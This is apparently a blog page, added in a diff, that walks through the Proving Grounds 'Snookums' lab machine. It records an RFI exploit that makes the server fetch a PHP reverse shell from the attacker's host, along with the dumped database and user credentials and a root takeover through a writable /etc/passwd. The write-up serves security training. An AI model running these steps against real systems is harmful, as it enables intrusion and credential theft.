@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Proving Grounds - Snookums</title>
+
+  
+  <meta name="author" content="Marius Žukovskis">
+  
+
+  <meta name="description" content="CTF Walkthrough">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+<!-- Google Analytics -->
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date(); a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+  })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+  ga('create', 'G-FRY4BRR0KD', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Proving Grounds - Snookums">
+  <meta property="og:description" content="CTF Walkthrough">
+
+  
+  <meta property="og:image" content="http://localhost:4000/assets/img/snookums/snookums.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Marius Žukovskis">
+  <meta property="og:article:published_time" content="2022-11-29T00:00:00+02:00">
+  <meta property="og:url" content="http://localhost:4000/2022-11-29-PG-Snookums/">
+  <link rel="canonical" href="http://localhost:4000/2022-11-29-PG-Snookums/">
+  
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <meta name="twitter:site" content="@">
+  <meta name="twitter:creator" content="@">
+
+  <meta property="twitter:title" content="Proving Grounds - Snookums">
+  <meta property="twitter:description" content="CTF Walkthrough">
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/assets/img/snookums/snookums.png">
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/posts">Posts</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/whoami">About Me</a>
+          </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+  <div id="header-big-imgs" data-num-img=1
+    
+    
+    
+      
+      data-img-src-1="http://localhost:4000/assets/img/snookums/snookums.png"
+    
+    
+    
+  ></div>
+
+
+<header class="header-section has-img">
+
+<div class="big-img intro-header">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Snookums</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 29, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class='img-desc'></span>
+</div>
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Proving Grounds - Snookums</h1>
+          
+            
+              <h2 class="post-subheading">CTF Walkthrough</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 29, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>Intermediate linux box found in TJNull OSCP like boxes list. Lets give it a try.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nmap -sV -sC -v 192.168.119.58 | tee nmap     
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.49.119
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Simple PHP Photo Gallery
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp open  mysql       MySQL (unauthorized)
+Service Info: Host: SNOOKUMS; OS: Unix
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
+| smb2-time: 
+|   date: 2022-11-29T10:20:59
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.4)
+|   Computer name: snookums
+|   NetBIOS computer name: SNOOKUMS\x00
+|   Domain name: \x00
+|   FQDN: snookums
+|_  System time: 2022-11-29T05:20:57-05:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>I discovered Simple PHP Photo Gallery on port 80. Did some basic enumeration, but haven’t found any key peaces of information that could aid in getting foothold.</p>
+
+<p><img src="/assets/img/snookums/1.png" alt="alt text" /></p>
+
+<p>Googling <strong>Simple PHP Photo Gallery v0.8</strong> I found an <a href="https://www.exploit-db.com/exploits/48424">RFI vulnerability</a> for SimplePHPGal 0.7 which I attempted to exploit. I’ve launched a port 80 listener to check if I will get a call from the server.</p>
+
+<p><img src="/assets/img/snookums/2.png" alt="alt text" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ nc -nvlp 80
+listening on [any] 80 ...
+connect to [192.168.49.119] from (UNKNOWN) [192.168.119.58] 53080
+GET / HTTP/1.0
+Host: 192.168.49.119
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<p>Looks like RFI is is valid. I then changes my listener to port 21 and launched a <strong>http.server</strong> on port 80 to serve this webserver a <a href="https://github.com/pentestmonkey/php-reverse-shell">php reverse shell</a> to see if I can get a shell back.</p>
+
+<p><img src="/assets/img/snookums/3.png" alt="alt text" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─$ nc -nvlp 21                                  
+listening on [any] 21 ...
+connect to [192.168.49.119] from (UNKNOWN) [192.168.119.58] 33852
+SOCKET: Shell has connected! PID: 2251
+whoami
+apache
+</code></pre></div></div>
+
+<p>Home directory contains Michael’s folder which I do not have access to. Additionally I’ve found db credentials in the same directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html
+bash-4.2$ ls
+ls
+README.txt		 image.php    phpGalleryConfig.php
+UpgradeInstructions.txt  images       phpGalleryStyle-RED.css
+css			 index.php    phpGalleryStyle.css
+db.php			 js	      phpGallery_images
+embeddedGallery.php	 license.txt  phpGallery_thumbs
+functions.php		 photos       thumbnail_generator.php
+bash-4.2$ cat db.php
+cat db.php
+&lt;?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+?&gt;
+</code></pre></div></div>
+
+<p>Using these credentials I got user credentials from SimplePHPGal database</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ mysql -u root -p
+mysql -u root -p
+Enter password: MalapropDoffUtilize1337
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 16
+Server version: 8.0.20 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| SimplePHPGal       |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.04 sec)
+
+ERROR: 
+No query specified
+
+mysql&gt; use SimplePHPGal
+use SimplePHPGal
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
+show tables;
++------------------------+
+| Tables_in_SimplePHPGal |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users;
+select * from users;
++----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
+| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
+| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
++----------+----------------------------------------------+
+3 rows in set (0.01 sec)
+</code></pre></div></div>
+
+<p>Looks like these credentials were encoded with double base64 encoding.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/ctf/pg_practice/snookums]
+└─$ echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d 
+SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                                                                                         
+
+┌──(kali㉿kali)-[~/ctf/pg_practice/snookums]
+└─$ echo "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d 
+HockSydneyCertify123  
+
+michael:HockSydneyCertify123 
+</code></pre></div></div>
+
+<p>Using credentials I have logged on as <strong>michael</strong> and collected local flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ su michael
+su michael
+Password: HockSydneyCertify123
+
+[michael@snookums html]$ ls ~
+ls ~
+local.txt
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege escalation</h3>
+
+<p>Did not find any low hanging fruit, so i spun up <strong>linpeas.sh</strong>. Which has found that <strong>/etc/passwd</strong> is writable.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/etc/passwd
+</code></pre></div></div>
+<p>Nano does not exist on this machine, and VI crashes without a proper terminal. So I had to convert my <strong>nc</strong> shell to proper shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[michael@snookums tmp]$ export TERM=xterm 
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/ctf/pg_practice/snookums]
+└─$ stty raw -echo; fg   
+</code></pre></div></div>
+<p>Then I have generated a password and updated the <strong>passwd</strong> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ openssl passwd toor
+$1$31aHA6zz$ZxVtWCDnN9kNRSmzFXVFO0
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@snookums tmp]# cat /etc/passwd
+root:$1$31aHA6zz$ZxVtWCDnN9kNRSmzFXVFO0:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+...
+</code></pre></div></div>
+
+<p>Logging in as root was successful. Machine has been owned. GG.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[michael@snookums tmp]$ su root
+Password: 
+[root@snookums tmp]# whoami
+root
+</code></pre></div></div>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#ctf">ctf</a>
+          
+            <a href="/tags#proving grounds">proving grounds</a>
+          
+            <a href="/tags#pg">pg</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Proving+Grounds+-+Snookums&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-29-PG-Snookums%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-11-29-PG-Snookums%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-11-29-PG-Snookums%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2022-11-19-PG-ZenPhoto/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - ZenPhoto">&larr; Previous Post</a>
+        </li>
+        
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="mailto:marius@zukovskis.lt" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/zukoma" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Marius Žukovskis
+        &nbsp;&bull;&nbsp;
+      
+      2022
+
+      
+
+      
+
+      
+
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
